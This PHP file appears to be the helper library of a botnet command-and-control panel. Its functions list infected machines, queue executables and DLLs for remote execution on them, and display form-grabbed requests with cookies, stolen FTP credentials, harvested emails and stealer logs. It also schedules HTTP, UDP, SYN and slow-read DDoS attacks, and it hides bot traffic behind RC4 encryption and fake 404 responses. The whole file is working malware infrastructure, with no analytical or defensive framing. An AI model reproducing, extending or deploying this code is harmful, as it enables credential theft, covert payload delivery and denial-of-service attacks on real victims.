<?php
$dbcon = 0;

function mysql_init(){
	global $config,$dbcon;
	if (!extension_loaded("mysqli")) die("php_mysqli extension not installed!");
	$dbcon = @mysqli_connect($config["dbhost"],$config["dbuser"],$config["dbpass"]);
	if ($dbcon){
		@mysqli_select_db($dbcon,$config["dbname"]);
		@mysqli_query($dbcon,"SET SESSION sql_mode=''") or die(mysqli_error($dbcon));
	} else die(mysqli_connect_error());
}

function form404(){
	$sapi_name = php_sapi_name();
	if ($sapi_name === "cgi" || $sapi_name === "cgi-fcgi" || $sapi_name === "fpm-fcgi") header("Status: 404 Not Found"); else header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
	$_SERVER["REDIRECT_STATUS"] = 404;
}

function savefile($file,$data){
	$handle = fopen($file,"a");
	flock($handle,LOCK_EX);
	fwrite($handle,$data);
	flock($handle,LOCK_UN);
	fclose($handle);
}

function savefileu($file, $data){
	if (!file_exists($file)){
		$handle = fopen($file,"ab");
		flock($handle, LOCK_EX);
		//$unc = "\xEF\xBB\xBF";
		$unc = "\xFF\xFE";
		fwrite($handle,$unc);
		flock($handle,LOCK_UN);
		fclose($handle);
	}
	$handle = fopen($file,"ab");
	flock($handle,LOCK_EX);
	fwrite($handle,$data);
	flock($handle,LOCK_UN);
	fclose($handle);
}

function get_ip(){
	foreach (array("HTTP_REAL_IP","HTTP_X_REAL_IP","HTTP_REMOTEADDR1","HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","HTTP_X_FORWARDED","HTTP_X_CLUSTER_CLIENT_IP","HTTP_FORWARDED_FOR","HTTP_FORWARDED","REMOTE_ADDR") as $key){
		if (array_key_exists($key,$_SERVER) === true){
			foreach (explode(",",$_SERVER[$key]) as $ip){
				if (filter_var($ip,FILTER_VALIDATE_IP,array("flags"=>array(FILTER_FLAG_IPV4,FILTER_FLAG_IPV6))) !== false) return $ip;
			}
		}
	}
}

function get_os($ver){
	switch ($ver){
		case 0x51: $os_id = 0; break;//XP
		case 0x52: $os_id = 1; break;//2003
		case 0x60: $os_id = 2; break;//Vista
		case 0x61: $os_id = 3; break;//7
		case 0x62: $os_id = 4; break;//8
		case 0x63: $os_id = 5; break;//8.1
		case 0xA0: $os_id = 6; break;//10
		default: $os_id = 7;
	}
	return $os_id;
}

function get_country($ip){
	$gi = geoip_open("./inc/geoip",GEOIP_STANDARD);
	$code = geoip_country_code_by_addr($gi,$ip);
	geoip_close($gi);
	if (strlen(trim($code)) < 2) $code = "XX";
	return $code;
}

function allexe(){
	global $config,$dbcon;
	$out = "";
	$idf = 1;
	$r = mysqli_query($dbcon,"SELECT * FROM `tasks` ORDER BY `id` ASC");
	while ($v = mysqli_fetch_assoc($r)){
		$out .= "<tr class=\"blank\"><td align=\"center\">{$idf}</td><td align=\"center\">";
		$out .= intval(@filesize("./exe/{$v['id']}.tmp")/1024);
		$date = date("d.m.Y H:i:s",$v["time"]);
		$out .= " Kb </td><td align=\"center\">{$date}</td><td align=\"center\">{$v["loads"]}</td><td align=\"center\">{$v["runs"]}</td><td align=\"center\"><a class=\"action\" href=\"?act=del&id={$v["id"]}\">Delete</a> | <a class=\"action\" href=\"?act=edit&id={$v["id"]}\">Edit</a> | ";
		if ($v["stop"] == 0) $out .= "<a class=\"action\" href=\"?act=stop&id={$v["id"]}\">Stop</a></td>";
		if ($v["stop"] == 1) $out .= "<a class=\"action\" href=\"?act=resume&id={$v["id"]}\">Resume</a></td>";
		$out .= "<td align=\"center\">{$v["limit"]}</td>";
		if (strlen($v["from"]) > 10) $out .= "<td align=\"center\"><div style=\"text-transform:none;\"><a href=\"{$v["from"]}\" target=\"_blank\">".substr($v["from"],0,15)."...</a></div></td>"; else $out .= "<td align=\"center\">local</td>";
		$out .= "<td align=\"center\"><div class=\"geopng\" title=\"{$v['country']}\"></div></td>";
		$runtype = "";
		if ($v["isdll"] == 0) $runtype = "Run as EXE";
		if ($v["isdll"] == 1) $runtype = "LoadLibrary";
		if ($v["isdll"] == 2) $runtype = "regsrv32";
		if ($v["isdll"] == 3) $runtype = "Run Mem";
		$out .= "<td align=\"center\">{$runtype}</td>";
		$bits= "";
		if ($v["bits"] == 0) $bits .= "x32 & x64";
		if ($v["bits"] == 1) $bits .= "x32";
		if ($v["bits"] == 2) $bits .= "x64";
		$out .= "<td align=\"center\">{$bits}</td>";
		$deleteafter = "No";
		if ($v["delafter"] == 1) $deleteafter = "<div style=\"font-weight:bold;color:red;\">Yes</div>";
		$out .= "<td align=\"center\">{$deleteafter}</td>";
		$out .= "<td align=\"center\"><div style=\"text-transform:none;\">{$v["comment"]}</div></td><td align=\"center\">{$v["seller"]}</td><td align=\"center\"><a class=\"action\" href=\"{$config["gpname"]}?id={$v["id"]}&key=".md5($config["guest"].$date)."\" target=\"_blank\">Link</a></td></tr>";
		$idf++;
	}
	return $out;
}

function allgexe($id){
	global $dbcon;
	$out = "";
	$id = intval(mysqli_real_escape_string($dbcon,$id));
	$r = mysqli_query($dbcon,"SELECT * FROM `tasks` WHERE `id`={$id}");
	while ($v = mysqli_fetch_assoc($r)){
		$out .= "<tr><td align=\"center\">".intval(@filesize("./exe/{$v["id"]}.tmp") / 1024)." Kb. </td><td align=\"center\">".date("d.m.Y H:i:s",$v["time"])."</td><td align=\"center\">{$v["loads"]}</td><td align=\"center\">{$v["runs"]}</td><td align=\"center\">{$v["limit"]}</td>";
		if (strlen($v["from"]) > 10) $out .= "<td align=\"center\">remote</td>"; else $out .= "<td align=\"center\">local</td>";
		$out.= "<td align=\"center\"><div class=\"geopng\" title=\"{$v['country']}\"></div></td>";
		$runtype = "";
		if ($v["isdll"] == 0) $runtype = "Run as EXE";
		if ($v["isdll"] == 1) $runtype = "LoadLibrary";
		if ($v["isdll"] == 2) $runtype = "regsrv32";
		if ($v["isdll"] == 3) $runtype = "Run Mem";
		$out .= "<td align=\"center\">{$runtype}</td>";
		$bits= "";
		if ($v["bits"] == 0) $bits .= "x32 & x64";
		if ($v["bits"] == 1) $bits .= "x32";
		if ($v["bits"] == 2) $bits .= "x64";
		$out .= "<td align=\"center\">{$bits}</td></tr>";
	}
	return $out;
}

function allbots($next,$htv_state){
	global $config,$dbcon;
	$out = "";
	$per_page = 20;
	if (empty($next)) $next = 1;
	$start = abs(($next - 1) * $per_page);
	$r = mysqli_query($dbcon,"SELECT * FROM `bots` ORDER BY `time` DESC LIMIT {$start},{$per_page}");
	while ($v = mysqli_fetch_assoc($r)){
		$color = "";
		if ($v["bits"] == 0) $bits = "x32"; else $bits = "x64";
		if ($v["privs"] == 0) $isadmin = "Medium+"; else $isadmin = "Low";
		if ($v["personal"] == 0) $personal = "Set"; else $personal = "Edit";
		if ($v["delete"] == 0) $state = "<a class=\"action\" href=\"?act=remove&id={$v["id"]}\">Delete</a>"; else $state = "<a class=\"action\" href=\"?act=removecancel&id={$v["id"]}\">On delete</a>";
		if ($v["time"] > time() - $config["interval"]) $color = "style=\"background-color:#caffc9\"";
		if ($v["ban"] == 0) $isban = "<a class=\"action\" href=\"?act=ban&id={$v["id"]}\">Ban</a>"; else {$color = "style=\"background-color:#ff8080;\""; $isban = "<a class=\"action\" href=\"?act=unban&id={$v["id"]}\">Unban</a>";}
		$htv = "";
		$htv_enable = "";
		if ($htv_state){
			if ($v["hget"] == 0) $htv_enable = " | <a class=\"action\" href=\"?act=gethtv&id={$v["id"]}\">Get HTV</a>"; else $htv_enable = " | <a class=\"action\" href=\"#\">HTV IDLE</a>";
			$htv_id = "-";
			$htv_pass = "-";
			if ($v["htime"] > time() - $config["interval"]){
				if (!empty($v["hid"]) && !empty($v["hpass"])){
					$htv_id = $v["hid"];
					$htv_pass = $v["hpass"];
				}
			}
			$htv = "<td align=\"center\"><div style=\"text-transform:none;\">{$htv_id}</div></td><td align=\"center\"><div style=\"text-transform:none;\">{$htv_pass}</div></td>";
		}
		$out .= "<tr class=\"blank\" {$color}><td align=\"center\">{$v["cname"]}</td><td align=\"center\">{$v["ip"]}";
		$out .= "</td><td align=\"center\"><div class=\"os{$v["os"]}png\"></div> - {$bits}</td><td align=\"center\">".date("d.m.Y H:i:s",$v["time"])."</td><td align=\"center\"><div class=\"".strtolower($v["country"])."gif\"></div> {$v["country"]}</td><td align=\"center\"><div style=\"text-transform:none;\">{$v["seller"]}</div></td><td align=\"center\">{$isadmin}</td>{$htv}<td align=\"center\"><a class=\"action\" href=\"#\" onclick=\"showdiv('personal',{$v["id"]}); return false\">{$personal}</a> | {$state} | {$isban}{$htv_enable}</td></tr>";
	}
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` ORDER BY `time` DESC");
	$row = mysqli_fetch_row($r);
	$total_rows = $row[0];
	$num_pages = ceil($total_rows / $per_page);
	if ($num_pages > 1)	$out .= "<tr class=\"bottom\"><td colspan=\"8\" align=\"center\"><div style=\"width:700px;\">Page: ".navigate($num_pages,$next,2,"{$config["cpname"]}?page=bots")."</div></td></tr>";
	return $out;
}

function sr_allbots(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT `bot_search` FROM `options`");
	$search = mysqli_fetch_assoc($r);
	return base64_decode($search["bot_search"]);
}

function getext($filename){
	$path_info = pathinfo($filename);
	return $path_info["extension"];
}

function bots(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function onbots(){
	global $config,$dbcon;
	$time = time() - $config["interval"];
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `time`>{$time}");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function tdbots(){
	global $dbcon;
	$time = time() - 86399;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `time`>{$time}");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function tasks(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `tasks`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function loads(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT SUM(`loads`) FROM `tasks`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function runs(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT SUM(`runs`) FROM `tasks`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function forupd(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `upd`=1");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	$cnt = intval($row[0]);
	if ($cnt > 0) $out = "<span style=\"font-weight:bold;color:red;\">Updating - {$cnt}</span>"; else $out = "Updating - {$cnt}";
	return $out;
}

function lastbots(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `bots` ORDER BY `time` DESC LIMIT 5");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "ID: {$v["cname"]} | IP: {$v["ip"]} | <div class=\"".strtolower($v["country"])."gif\"></div> {$v["country"]} | DATE: ".date("d.m.Y H:i:s",$v["time"])."<br>";
	return $out;
}

function os(){
	global $OS,$dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT `os`,COUNT(*) as `cnt` FROM `bots` GROUP BY `os` ORDER BY `cnt` DESC");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "<div align=\"left\"><div style=\"height:15px;\"><div class=\"os{$v["os"]}png\"></div> {$OS[$v["os"]]} - {$v["cnt"]}</div><br>";
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `bits`=0");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	$x86 = intval($row[0]);
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `bits`=1");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	$x64 = intval($row[0]);
	$out .= "</div><div align=\"center\"><br>x32 - {$x86}<br>x64 - {$x64}</div>";
	return $out;
}

function privileges(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `privs`=0");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	$medhigh = intval($row[0]);
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `privs`=1");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	$low = intval($row[0]);
	$out .= "Low - {$low}<br>Medium+ - {$medhigh}";
	return $out;
}

function countries(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT `country`,COUNT(*) as `cnt` FROM `bots` GROUP BY `country` ORDER BY `cnt` DESC");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "<div style=\"height:5px;\"><div class=\"".strtolower($v["country"])."gif\"></div> {$v["country"]} - {$v["cnt"]}</div><br>";
	return $out;
}

function oncountries(){
	global $config,$dbcon;
	$out = "";
	$time = time() - $config["interval"];
	$r = mysqli_query($dbcon,"SELECT `country`,COUNT(*) as `cnt` FROM `bots` WHERE `time`>{$time} GROUP BY `country` ORDER BY `cnt` DESC");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "<div style=\"height:5px;\"><div class=\"".strtolower($v["country"])."gif\"></div> {$v["country"]} - {$v["cnt"]}</div><br>";
	return $out;
}

function installed(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `installed`=1");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function sellers(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT `seller`,COUNT(*) as `cnt` FROM `bots` GROUP BY `seller` ORDER BY `cnt` DESC");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "<div style=\"height:5px;\"><div class=\"sellerpng\"></div> {$v["seller"]} - {$v["cnt"]}</div><br>";
	return "<div style=\"text-transform:none;\">{$out}</div>";
}

function onsellers(){
	global $config,$dbcon;
	$out = "";
	$time = time() - $config["interval"];
	$r = mysqli_query($dbcon,"SELECT `seller`,COUNT(*) as `cnt` FROM `bots` WHERE `time`>{$time} GROUP BY `seller` ORDER BY `cnt` DESC");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "<div style=\"height:5px;\"><div class=\"sellerpng\"></div> {$v["seller"]} - {$v["cnt"]}</div><br>";
	return "<div style=\"text-transform:none;\">{$out}</div>";
}

function getpluginshash(){
	$out = "";
	$handle = @fopen("./mods/plugins","r");
	if ($handle){
		fseek($handle,18);
		$data = fread($handle,16);
		fclose($handle);
		for ($i = 0;$i < 16;$i++) $out .= sprintf("%02x",ord($data[$i]));
	}
	return $out;
}

function getplugins($module){
	global $plugins;
	if (file_exists($module)){
		$handle = fopen($module,"r");
		fseek($handle,8);
		$enc = unpack("i",fread($handle,4));
		fclose($handle);
		return $enc[1];
	} else return 0;
}

function getpluginssize($module){
	if (file_exists($module)){
		$pluginsize = intval(@filesize($module));
		$handle = fopen($module,"r");
		$size = unpack("i",fread($handle,4));
		fclose($handle);
		if ($size[1] != $pluginsize) return 2; else return 1;
	} else return 0;
}

function isencrypted($file){
	if (file_exists($file)){
		$handle = fopen($file,"r");
		$mz = fread($handle,2);
		fclose($handle);
		if (strpos($mz,"MZ") === false) return true;
	}
	return false;
}

function totalreports(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `formgrab`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function last5_reports(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `formgrab` ORDER BY `time` DESC LIMIT 5");
		while ($v = mysqli_fetch_assoc($r)){
			$id = $v["cname"];
			$browser = $v["browser"];
			$url = $v["url"];
			//$data = urldecode($v["data"]);
			$data = str_replace("&","\r\n",$v["data"]);
			$data = urldecode($data);
			$ua = $v["uagent"];
			$cookie = $v["cookies"];
			$time = date("d.m.Y H:i:s",$v["time"]);
			$out .= "Bot ID: {$id}\r\nBrowser: {$browser}\r\nURL: {$url}\r\nUser-Agent: {$ua}\r\nCookie: {$cookie}\r\nDate: {$time}\r\nRequest: \r\n{$data}\r\n\r\n";
		}
	return $out;
}

function totalftps(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `ftpgrab`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function getftpslist50(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `ftpgrab` LIMIT 50");
	while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["data"]}\r\n";
	return $out;
}

function getftpslist(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `ftpgrab`");
	while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["data"]}\r\n";
	return $out;
}

function fgfilter(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT `fgfilter` FROM `plugins`");
	$search = mysqli_fetch_assoc($r);
	return $search["fgfilter"];
}

function RC4($data,$key,$datalen,$keylen){
	$s = array();
	for ($i = 0;$i < 256;$i++)$s[$i] = $i;
	$j = 0;$x;
	for ($i = 0;$i < 256;$i++){
		$j = ($j + $s[$i] + ord($key[$i % $keylen])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;$j = 0;$result = "";$y;
	for ($y = 0;$y < $datalen;$y++){
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$result .= $data[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $result;
}

function allprocmon(){
	global $dbcon;
	$out = "";
	$idf = 1;
	$r = mysqli_query($dbcon,"SELECT * FROM `procmon` ORDER BY `id` ASC");
	while ($v = mysqli_fetch_assoc($r)){
		$out .= "<tr class=\"blank\"><td align=\"center\">{$idf}</td><td align=\"center\"><span style=\"text-transform:none;\">{$v["process"]}</span></td><td align=\"center\">";
		$type = "";
		if ($v["type"] == 0) $type .= "D & E";
		if ($v["type"] == 1) $type .= "Kill Process";
		if ($v["type"] == 2) $type .= "Reboot PC";
		$out .= "{$type}</td><td align=\"center\">";
		if ($v["type"] == 0) $out .= intval(@filesize("./exe/pm_{$v["id"]}.tmp") / 1024); else $out .= "0";
		$out .= " Kb </td><td align=\"center\">".date("d.m.Y H:i:s",$v["time"])."</td><td align=\"center\">{$v["success"]}</td>";
		if ($v["type"] == 0 && strlen($v["url"]) > 10) $out .= "<td align=\"center\"><a href=\"{$v["url"]}\" target=\"_blank\"><span style=\"text-transform:none;\">".substr($v["url"],0,15)."...</span></a></td>"; elseif ($v["type"] == 0 && strlen($v["url"]) < 10) $out .= "<td align=\"center\" style=\"width:145px;\">local</td>"; else $out .= "<td align=\"center\">-</td>";
		$out .= "<td align=\"center\">{$v["comment"]}</td><td align=\"center\"><a class=\"action\" href=\"?act=pm_del&id={$v["id"]}\">Delete</a> | ";
		if ($v["stop"] == 0) $out .= "<a class=\"action\" href=\"?act=pm_stop&id={$v["id"]}\">Stop</a></td>";
		if ($v["stop"] == 1) $out .= "<a class=\"action\" href=\"?act=pm_resume&id={$v["id"]}\">Resume</a></td>";
		$out .= "</tr>";
		$idf++;
	}
	return $out;
}

function SetPMRules(){
	global $dbcon;
	$rules = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `procmon` ORDER BY `id` ASC");
	while ($v = mysqli_fetch_assoc($r)) if ($v["stop"] == 0) $rules.= "{$v["process"]}|{$v["type"]}?{$v["id"]},";
	mysqli_query($dbcon,"UPDATE `plugins` SET `procmon_rules`='{$rules}'");
}

function get_mode($mode){
	switch ($mode){
		case "http-get": $result = 0; break;
		case "http-post": $result = 1; break;
		case "download": $result = 2; break;
		case "udp": $result = 3; break;
		case "syn": $result = 4; break;
		case "tcp": $result = 5; break;
		case "https-get": $result = 6; break;
		case "http-slw": $result = 7; break;
		default: $result = 8;
	}
	return $result;
}

function ddostask(){
	global $ATTACK,$dbcon;
	$idf = 1;
	$r = mysqli_query($dbcon,"SELECT * FROM `ddos` ORDER BY `id` ASC");
	$out = "";
	while ($v = mysqli_fetch_assoc($r)){
		$out .= "<tr class=\"blank\"><td align=\"center\">{$idf}</td><td align=\"center\">{$ATTACK[$v["mode"]]}</td>";
		if ($v["state"] == 0) $state = "Active"; else $state = "Pause";
		$out .= "<td align=\"center\"><span style=\"text-transform:none;\">{$v["url"]}</span></td><td align=\"center\">{$state}</td><td align=\"center\">";
		if ($v["state"] == 0) $out .= "<a class=\"action\" href=\"?act=ddosstop&id={$v["id"]}\">Stop</a>"; else $out .= "<a class=\"action\" href=\"?act=ddosresume&id={$v["id"]}\">Resume</a>";
		$out .= " | <a class=\"action\" href=\"?act=ddosdel&id={$v["id"]}\">Delete</a></td></tr>";
		$idf++;
	}
	return $out;
}

function onddos(){
	global $config,$dbcon;
	$time = time() - $config["interval"];
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `bots` WHERE `ddos`=1 AND `time`>{$time}");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function SetDDoSRules(){
	global $dbcon;
	$rules = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `ddos` ORDER BY `id` ASC");
	while ($v = mysqli_fetch_assoc($r)) if ($v["state"] == 0) $rules .= "{$v["mode"]}|{$v["url"]},";
	if (strlen($rules) < 5) $rules = "empty";
	mysqli_query($dbcon,"UPDATE `plugins` SET `ddos_rules`='{$rules}'");
}

function MakeOutput($data,$addplugins){
	form404();
	$result = "";
	$tmp = pack("s",MAGIC).$data;
	$str = RC4($tmp,pack("i",encryptkey),strlen($tmp),4);
	$result = pack("i",strlen($str)).$str;
		switch (intval($addplugins)){
			case 0:
				echo $result;
				break;
			case 1:
				echo $result.chr(0);
				readfile("./mods/plugins");
				break;
		}
	die();
}

function MakeOutputFile($mode,$delafter,$file,$remote){
	form404();
	switch (intval($remote)){
		case 0:
			echo chr($mode).chr($delafter);
			readfile("./exe/{$file}");
			break;
		case 1:
			echo chr($mode).chr($delafter)."Location: {$file}";
			break;
	}
	die();
}

function MakeOutputFilePlain($file,$remote){
	form404();
	switch (intval($remote)){
		case 0:
			readfile("./exe/{$file}");
			break;
		case 1:
			echo "Location: {$file}";
			break;
	}
	die();
}

function navigate($maxpage,$currentpage,$near,$url){
	$j = 0;
	$out = "";
	if (($currentpage - $near) < 1) $i = 1; else $i = $currentpage-$near;
	if ($i == 1) $i++;
	if (($maxpage - ($near * 2 + 1)) < $i) $i = $maxpage - ($near * 2 + 1);
	if ($i < 2) $i = 2;
	if ($currentpage != 1) $out .= "<a href=\"{$url}&next=1\">1</a> "; else $out .= "[1] ";
	if ($i > 2) $out .= "...";
	while ((($i <= ($currentpage+$near)) || ($j < ($near * 2 + 1))) && ($i < $maxpage)){
		if ($i != $currentpage) $out .= "<a href=\"{$url}&next={$i}\">{$i}</a> "; else $out .= "[{$i}] ";
		$i++;
		$j++;
	}
	if ($i < $maxpage) $out .= "...";
	if ($maxpage > 1){
		if ($maxpage != $currentpage) $out .= "<a href=\"{$url}&next={$maxpage}\">{$maxpage}</a> "; else $out .= "[{$maxpage}]";
	}
	return $out;
}

function totalemails(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `emailgrab`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function getemailslist50(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `emailgrab` LIMIT 50");
	while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["data"]}\r\n";
	return $out;
}

function getemailslist(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT * FROM `emailgrab`");
	while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["data"]}\r\n";
	return $out;
}

function totalstealer(){
	global $dbcon;
	$r = mysqli_query($dbcon,"SELECT COUNT(*) FROM `stealer`");
	$row = mysqli_fetch_array($r,MYSQLI_NUM);
	return intval($row[0]);
}

function stealertopsoft(){
	global $STEALER,$dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT `softid`,COUNT(*) as `cnt` FROM `stealer` GROUP BY `softid` ORDER BY `cnt` DESC LIMIT 10");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "{$STEALER[$v["softid"]]} - {$v["cnt"]}<br>";
	return $out;
}

function stealertopurls(){
	global $dbcon;
	$out = "";
	$r = mysqli_query($dbcon,"SELECT `host`,COUNT(*) as `cnt` FROM `stealer` GROUP BY `host` ORDER BY `cnt` DESC LIMIT 10");
	if (!mysqli_num_rows($r)) return "N/A";
	while ($v = mysqli_fetch_assoc($r)) $out .= "{$v["host"]} - {$v["cnt"]}<br>";
	return $out;
}

function stealerlogs($next){
	global $config,$dbcon;
	$out = "";
	$per_page = 20;
	if (empty($next)) $next = 1;
	$start = abs(($next - 1) * $per_page);
	$r = mysqli_query($dbcon,"SELECT `cname`,COUNT(*) as `cnt` FROM `stealer` GROUP BY `cname` ORDER BY `time` DESC LIMIT {$start},{$per_page}");
	while ($v = mysqli_fetch_assoc($r)){
		$out .= "<tr class=\"blank\"><td align=\"center\" colspan=\"2\">{$v["cname"]}</td><td align=\"center\">{$v["cnt"]}</td><td align=\"center\"><a class=\"action\" target=\"_blank\" href=\"?act=showlog&id={$v["cname"]}\">Show</a> | <a class=\"action\" href=\"?act=dellog&id={$v["cname"]}\" onclick=\"return confirm('Are you sure?')\">Delete</a></td></tr>";
	}
	$r = mysqli_query($dbcon,"SELECT COUNT(DISTINCT `cname`) FROM `stealer`");
	$row = mysqli_fetch_row($r);
	$total_rows = $row[0];
	$num_pages = ceil($total_rows / $per_page);
	if ($num_pages > 1) $out .= "<tr class=\"bottom\"><td colspan=\"4\" align=\"center\">Page: ".navigate($num_pages,$next,2,"{$config["cpname"]}?page=stealer")."</td></tr>";
	return $out;
}

?>